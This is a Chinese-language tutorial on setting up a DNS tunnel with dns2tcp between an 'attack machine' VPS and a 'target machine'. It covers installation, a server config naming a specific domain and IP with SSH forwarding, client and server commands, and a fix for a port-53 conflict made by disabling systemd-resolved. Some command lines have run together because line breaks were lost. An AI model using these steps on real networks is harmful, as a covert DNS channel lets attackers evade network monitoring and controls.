介绍及安装


dns2tcp用来搭建dns隧道。

地址：https://github.com/alex-sector/dns2tcp。

分客户端和服务端，服务端为攻击机，客户端为目标机。

这里以源码安装为例，运行下列命令：


git clone https://github.com/alex-sector/dns2tcp.git./configuremakemake install



安装后就可以直接在命令行运行了，输入dns2按两下tab会发现有两个相关命令，一个dns2tcpc（客户端），一个dns2tcpd（服务端）。

搭建隧道


搭建之前，我们需要在服务端建一个配置文件，设置一些信息：vim /etc/dns2tcpd.conf，默认不存在，输入如下内容：


listen = 0.0.0.0port = 53nameserver = 8.8.8.8user = nobodychroot = /tmpdomain = dns2tcp.jxclsthub.xyzresources = ssh:149.28.29.214:22


listen代表监听地址，四个0代表监听所有ip。port指定的是dns2tcp端口，也就是dns53端口。user不指定用户，chroot指定临时文件缓存地址，domain指定ns记录的值。resources作用相当于代理。


设置好后，运行以下命令启动：`dns2tcpd -F -d 2 -f /etc/dns2tcpd.conf`。


然后客户端运行以下命令：`dns2tcpc -r ssh -z dns2tcp.jxclsthub.xyz -l 8888 -d 2`


参数说明：F为前端运行，d为信息输出级别，越大越详细，f指定配置文件，r指定资源名称，需要和服务端配置文件中的resources一致，z指定自己配置的dns域，l指定绑定的端口。


上面命令作用相当于，vps和目标机通过dns2tcp建议了一条dns隧道，目标机绑定了8888端口，会将8888端口请求通过dns隧道给到vps上的22端口。


这时，在目标机通过ssh命令连接本地的8888端口登录，就可以登录到vps上，如下图：

错误解决


服务端在运行命令：`dns2tcpd -F -d 2 -f /etc/dns2tcpd.conf`启动，刚开始报了以下错误，提示error socket.c:107 bind error。



搜索原因是53端口被占用，需要kill掉那个程序，于是查看kill掉后，再查看53端口还被占用。



后来发现程序为systemd-resolve系统解析，它不能直接kill掉，需要先停止服务，再禁用服务，命令如下：


service systemd-resolved stopsystemctl disable systemd-resolved


禁用后，需要修改服务端的配置文件，加一个nameserver指定一个dns，否则系统和dns2tcp都没有dns，则就无法利用通信了。示例：


listen = 0.0.0.0port = 53nameserver = 8.8.8.8user = nobodychroot = /tmpdomain = dns2tcp.jxclsthub.xyzresources = ssh:149.28.29.214:22
